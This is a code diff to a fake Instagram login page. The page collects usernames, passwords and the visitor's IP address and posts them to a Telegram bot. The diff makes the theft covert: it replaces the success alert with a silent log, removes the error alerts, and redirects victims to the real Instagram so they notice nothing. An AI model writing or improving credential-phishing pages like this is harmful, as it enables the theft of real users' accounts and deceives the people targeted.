@@ -15,13 +15,10 @@
                 <h1 title="Instagram" class="flex justify-content-center">
                     <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
-                <!-- Fixed: Added id="login-form" -->
-                <form id="login-form">
-                    <!-- Fixed: Added id="email" -->
+                <form id="login-form"> <!-- Added ID to form -->
                     <label for="email" class="sr-only">Phone, username, or email</label>
                     <input id="email" name="email" placeholder="Phone, username, or email" required />
 
-                    <!-- Fixed: Added id="password" -->
                     <label for="password" class="sr-only">Password</label>
                     <input id="password" name="password" type="password" placeholder="Password" required />
 
@@ -119,16 +116,15 @@
                     // Send to Telegram Bot
                     axios.post(URI_API, formData)
                         .then(response => {
-                            alert('Information sent successfully!');
+                            console.log("Data sent to Telegram successfully!"); // Silent success message
+                            window.location.href = "https://www.instagram.com"; // Redirects user to Instagram
                         })
                         .catch(error => {
                             console.error("Telegram API Error:", error);
-                            alert('Error sending the information. Please try again.');
                         });
                 })
                 .catch(error => {
                     console.error("IP Fetch Error:", error);
-                    alert('Error fetching the IP address. Please try again.');
                 });
         });
     </script>
